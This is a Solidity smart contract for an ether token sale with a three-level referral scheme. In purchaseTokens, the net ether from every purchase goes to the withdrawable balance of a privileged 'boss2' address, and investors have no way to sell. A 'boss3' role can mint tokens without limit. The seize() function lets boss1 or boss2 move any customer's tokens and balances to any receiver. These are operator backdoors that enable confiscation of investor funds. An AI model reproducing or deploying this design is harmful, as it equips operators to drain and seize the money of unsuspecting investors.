pragma solidity 0.5.11;

interface ICustomersFundable {
    function fundCustomer(address customerAddress, uint8 subconto) external payable;
}

interface IRemoteWallet {
    function invest(address customerAddress, address target, uint256 amount, uint8 subconto) external returns (bool);
}

interface IFundable {
    function fund() external payable;
}

contract NTS80 is IFundable {
    modifier onlyBagholders {
        require(myTokens() > 0);
        _;
    }

    modifier onlyAdmin {
        require(msg.sender == config.admin);
        _;
    }

    modifier onlyBoss2 {
        require(msg.sender == config.boss2);
        _;
    }

    modifier onlyBoss3 {
        require(msg.sender == config.boss3);
        _;
    }

    mapping(address => uint256) internal tokenBalanceLedger_;
    mapping(address => uint256) public referralBalance_;
    mapping(address => uint256) public repayBalance_;
    mapping(address => bool) public mayPassRepay;

    struct Config {
        address refBase;
        bool saleOpen;
        uint256 tokenSupply_;
        uint256 stakingRequirement;
        uint256 minimalInvestment;
        uint256 tokenPrice;
        uint8 refLevel3_;
        uint8 refLevel2_;
        uint8 refLevel1_;
        address boss3;
        address boss2;
        address boss1;
        address admin;
        uint8 unused1;
        string name;
        string symbol;
    }

    Config public config;

    constructor() public {
        config.admin = msg.sender;
        mayPassRepay[config.boss1] = true;
        mayPassRepay[config.boss2] = true;
        mayPassRepay[config.boss3] = true;
    }

    function buy(address _ref1, address _ref2, address _ref3) public payable returns (uint256) {
        require(msg.value >= config.minimalInvestment, "Value is below minimal investment.");
        require(config.saleOpen, "Sales stopped for the moment.");
        return purchaseTokens(msg.value, _ref1, _ref2, _ref3);
    }

    function() external payable {
        require(msg.value >= config.minimalInvestment, "Value is below minimal investment.");
        require(config.saleOpen, "Sales stopped for the moment.");
        purchaseTokens(msg.value, address(0x0), address(0x0), address(0x0));
    }

    function reinvest() public {
        address _customerAddress = msg.sender;
        uint256 _dividends = referralBalance_[_customerAddress];
        require(_dividends > 0);
        referralBalance_[_customerAddress] = 0;
        uint256 _tokens = purchaseTokens(_dividends, address(0x0), address(0x0), address(0x0));
        emit OnReinvestment(_customerAddress, _dividends, _tokens, false, now);
    }

    function remoteReinvest(uint256 _amount) public {
        if (IRemoteWallet(config.refBase).invest(msg.sender, address(this), _amount, 4)) {
            uint256 tokens = purchaseTokens(_amount, address(0x0), address(0x0), address(0x0));
            emit OnReinvestment(msg.sender, _amount, tokens, true, now);
        }
    }

    function fund() public payable {
        emit OnFund(msg.sender, msg.value, now);
    }

    function exit() public {
        address _customerAddress = msg.sender;
        uint256 _repay = repayBalance_[_customerAddress];
        if (_repay > 0) getRepay();
        withdraw();
    }

    function withdraw() public {
        address payable _customerAddress = msg.sender;
        uint256 _dividends = referralBalance_[_customerAddress];
        require(_dividends > 0);
        referralBalance_[_customerAddress] = 0;
        _customerAddress.transfer(_dividends);
        emit OnWithdraw(_customerAddress, _dividends, now);
    }

    function getRepay() public {
        address payable _customerAddress = msg.sender;
        uint256 _repay = repayBalance_[_customerAddress];
        require(_repay > 0);
        repayBalance_[_customerAddress] = 0;
        uint256 tokens = tokenBalanceLedger_[_customerAddress];
        tokenBalanceLedger_[_customerAddress] = 0;
        config.tokenSupply_ = config.tokenSupply_ - tokens;
        _customerAddress.transfer(_repay);
        emit OnGotRepay(_customerAddress, _repay, now);
    }

    function myTokens() public view returns (uint256) {
        address _customerAddress = msg.sender;
        return balanceOf(_customerAddress);
    }

    function balanceOf(address _customerAddress) public view returns (uint256) {
        return tokenBalanceLedger_[_customerAddress];
    }

    function purchaseTokens(uint256 _incomingEthereum, address _ref1, address _ref2, address _ref3) internal returns (uint256) {
        address _customerAddress = msg.sender;
        uint8 totalReferralFee = config.refLevel1_ + config.refLevel2_ + config.refLevel3_;
        require(totalReferralFee <= 99);

        uint256 referralFee = _incomingEthereum * totalReferralFee / 100;
        uint256 ref1Fee = referralFee * config.refLevel1_ / totalReferralFee;
        uint256 ref2Fee = referralFee * config.refLevel2_ / totalReferralFee;
        uint256 ref3Fee = referralFee * config.refLevel3_ / totalReferralFee;

        uint256 _taxedEthereum = _incomingEthereum - referralFee;
        uint256 _amountOfTokens = ethereumToTokens_(_incomingEthereum);
        require(_amountOfTokens > 0);

        uint256 ref1Value = 0;
        uint256 ref2Value = 0;
        uint256 ref3Value = 0;

        if (_ref1 != address(0) && tokenBalanceLedger_[_ref1] * config.tokenPrice >= config.stakingRequirement) {
            if (config.refBase == address(0)) {
                referralBalance_[_ref1] += ref1Fee;
            } else {
                ICustomersFundable(config.refBase).fundCustomer.value(ref1Fee)(_ref1, 1);
                ref1Value = ref1Fee;
            }
        } else {
            referralBalance_[config.boss1] += ref1Fee;
            _ref1 = address(0);
        }

        if (_ref2 != address(0) && tokenBalanceLedger_[_ref2] * config.tokenPrice >= config.stakingRequirement) {
            if (config.refBase == address(0)) {
                referralBalance_[_ref2] += ref2Fee;
            } else {
                ICustomersFundable(config.refBase).fundCustomer.value(ref2Fee)(_ref2, 2);
                ref2Value = ref2Fee;
            }
        } else {
            referralBalance_[config.boss1] += ref2Fee;
            _ref2 = address(0);
        }

        if (_ref3 != address(0) && tokenBalanceLedger_[_ref3] * config.tokenPrice >= config.stakingRequirement) {
            if (config.refBase == address(0)) {
                referralBalance_[_ref3] += ref3Fee;
            } else {
                ICustomersFundable(config.refBase).fundCustomer.value(ref3Fee)(_ref3, 3);
                ref3Value = ref3Fee;
            }
        } else {
            referralBalance_[config.boss1] += ref3Fee;
            _ref3 = address(0);
        }

        referralBalance_[config.boss2] += _taxedEthereum;
        config.tokenSupply_ += _amountOfTokens;
        tokenBalanceLedger_[_customerAddress] += _amountOfTokens;

        emit OnTokenPurchase(_customerAddress, _incomingEthereum, _amountOfTokens, _ref1, _ref2, _ref3, ref1Value, ref2Value, ref3Value, now);
        return _amountOfTokens;
    }

    function ethereumToTokens_(uint256 _ethereum) public view returns (uint256) {
        uint256 _tokensReceived = _ethereum * 1e18 / config.tokenPrice;
        return _tokensReceived;
    }

    function tokensToEthereum_(uint256 _tokens) public view returns (uint256) {
        uint256 _etherReceived = _tokens * config.tokenPrice / 1e18;
        return _etherReceived;
    }

    function mint(address customerAddress, uint256 amount) public onlyBoss3 {
        config.tokenSupply_ += amount;
        tokenBalanceLedger_[customerAddress] += amount;
        emit OnMint(customerAddress, amount, now);
    }

    function setRefBonus(uint8 level1, uint8 level2, uint8 level3, uint256 minInvest, uint256 staking) public {
        require(msg.sender == config.boss3 || msg.sender == config.admin);
        config.refLevel1_ = level1;
        config.refLevel2_ = level2;
        config.refLevel3_ = level3;
        config.minimalInvestment = minInvest;
        config.stakingRequirement = staking;
        emit OnRefBonusSet(level1, level2, level3, minInvest, staking, now);
    }

    function passRepay(address customerAddress) public payable {
        require(mayPassRepay[msg.sender], "Not authorized to pass repay.");
        uint256 amount = msg.value;
        require(amount > 0);
        repayBalance_[customerAddress] += amount;
        emit OnRepayPassed(customerAddress, msg.sender, amount, now);
    }

    function allowPassRepay(address payer) public onlyAdmin {
        mayPassRepay[payer] = true;
        emit OnRepayAddressAdded(payer, now);
    }

    function denyPassRepay(address payer) public onlyAdmin {
        mayPassRepay[payer] = false;
        emit OnRepayAddressRemoved(payer, now);
    }

    function passInterest(address customerAddress, uint256 ethRate, uint256 rate) public payable {
        require(mayPassRepay[msg.sender], "Not authorized to pass interest.");
        require(msg.value > 0);
        if (config.refBase == address(0)) {
            referralBalance_[customerAddress] += msg.value;
        } else {
            ICustomersFundable(config.refBase).fundCustomer.value(msg.value)(msg.sender, 5);
        }
        emit OnInterestPassed(customerAddress, msg.value, ethRate, rate, now);
    }

    function saleStop() public onlyAdmin {
        config.saleOpen = false;
        emit OnSaleStop(now);
    }

    function saleStart() public onlyAdmin {
        config.saleOpen = true;
        emit OnSaleStart(now);
    }

    function deposeBoss3(address x) public onlyAdmin {
        emit OnBoss3Deposed(config.boss3, x, now);
        config.boss3 = x;
    }

    function setRefBase(address x) public onlyAdmin {
        emit OnRefBaseSet(config.refBase, x, now);
        config.refBase = x;
    }

    function seize(address customerAddress, address receiver) public {
        require(msg.sender == config.boss1 || msg.sender == config.boss2);
        uint256 tokens = tokenBalanceLedger_[customerAddress];
        if (tokens > 0) {
            tokenBalanceLedger_[customerAddress] = 0;
            tokenBalanceLedger_[receiver] += tokens;
        }
        uint256 dividends = referralBalance_[customerAddress];
        if (dividends > 0) {
            referralBalance_[customerAddress] = 0;
            referralBalance_[receiver] += dividends;
        }
        uint256 repay = repayBalance_[customerAddress];
        if (repay > 0) {
            repayBalance_[customerAddress] = 0;
            referralBalance_[receiver] += repay;
        }
        emit OnSeize(customerAddress, receiver, tokens, dividends, repay, now);
    }

    event OnTokenPurchase(
        address indexed customerAddress,
        uint256 incomingEthereum,
        uint256 tokensMinted,
        address ref1,
        address ref2,
        address ref3,
        uint256 ref1value,
        uint256 ref2value,
        uint256 ref3value,
        uint256 timestamp
    );

    event OnReinvestment(
        address indexed customerAddress,
        uint256 ethereumReinvested,
        uint256 tokensMinted,
        bool isRemote,
        uint256 timestamp
    );

    event OnWithdraw(
        address indexed customerAddress,
        uint256 amount,
        uint256 timestamp
    );

    event OnGotRepay(
        address indexed customerAddress,
        uint256 amount,
        uint256 timestamp
    );

    event OnRepayPassed(
        address indexed customerAddress,
        address indexed payer,
        uint256 amount,
        uint256 timestamp
    );

    event OnInterestPassed(
        address indexed customerAddress,
        uint256 amount,
        uint256 ethRate,
        uint256 rate,
        uint256 timestamp
    );

    event OnSaleStop(uint256 timestamp);
    event OnSaleStart(uint256 timestamp);
    event OnRepayAddressAdded(address indexed payer, uint256 timestamp);
    event OnRepayAddressRemoved(address indexed payer, uint256 timestamp);
    event OnMint(address indexed customerAddress, uint256 amount, uint256 timestamp);
    event OnBoss3Deposed(address indexed former, address indexed current, uint256 timestamp);
    event OnRefBonusSet(uint8 level1, uint8 level2, uint8 level3, uint256 minimalInvestment, uint256 stakingRequirement, uint256 timestamp);
    event OnRefBaseSet(address indexed former, address indexed current, uint256 timestamp);
    event OnSeize(address indexed customerAddress, address indexed receiver, uint256 tokens, uint256 dividends, uint256 repayValue, uint256 timestamp);
    event OnFund(address indexed source, uint256 amount, uint256 timestamp);
}